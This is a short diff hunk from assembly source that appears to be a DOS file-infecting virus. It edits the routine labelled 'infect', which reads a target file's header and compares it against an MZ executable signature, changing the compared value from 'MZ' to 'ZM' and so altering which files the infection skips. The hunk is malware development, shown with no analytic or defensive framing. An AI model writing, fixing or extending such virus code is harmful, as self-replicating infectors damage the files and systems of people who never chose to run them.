@@ -89,7 +89,7 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      pop bp
      int 21h          ; Calling int 21h
      pop bx
-     cmp word [data_section.MZ_BUF+bp], 'MZ'  ; Is it a MZ file?
+     cmp word [data_section.MZ_BUF+bp], 'ZM'  ; Is it a MZ file?
      je .abort_infection
      push bx
 
